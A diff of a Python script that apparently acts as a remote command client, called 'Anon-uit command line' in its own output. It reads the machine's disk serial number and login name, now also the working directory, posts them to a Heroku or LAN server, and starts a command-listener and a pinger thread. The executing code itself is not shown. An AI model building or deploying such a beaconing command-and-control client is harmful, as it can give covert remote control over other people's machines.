@@ -5,18 +5,21 @@ import time
 from datetime import datetime
 
 endpoint_3 = 'http://127.0.0.1:8000/'
-endpoint_2 = 'https://example.com/'
-endpoint_1 = 'https://xxremote.herokuapp.com/'
+endpoint_1 = 'http://172.20.10.6:8000/'
+endpoint_2 = 'https://xxremote.herokuapp.com/'
+
 
 
 uid = f'{os.popen("wmic diskdrive get serialnumber").read().split()[-1]}'
 # uid = 'IIJS8EUU-SO023-S0SS'
 name = os.getlogin()
 
+
 def login():
     print(name)
     print(uid)
-    content = {'name': name, 'uid': uid}
+    content = {'name': name, 'uid': uid, 'cwd': str(os.getcwd())}
+    print(content)
     login = requests.post(f'{endpoint_1}login', json=content)
     login = dict(login.json())
     print(login)
@@ -25,11 +28,13 @@ def login():
 
 def threader():
     t1 = Thread(target=commands)
-    #t2 = Thread(target=receiver)
+    # t2 = Thread(target=receiver)
     t3 = Thread(target=ping)
+    print('pinger thread...')
     t3.start()
+    print('commands execution thread...')
     t1.start()
-    #t2.start()
+    # t2.start()
 
 
 def receiver():
@@ -42,6 +47,7 @@ def receiver():
             sender = message['sender']
             message = message['message']['message']
             print(f'Anon-uit command line [Version 0.0.1]/{sender}: {message}')
+
 
 def commands():
     print('Anon-uit command line [Version 0.0.1]/Starting command listerner...')
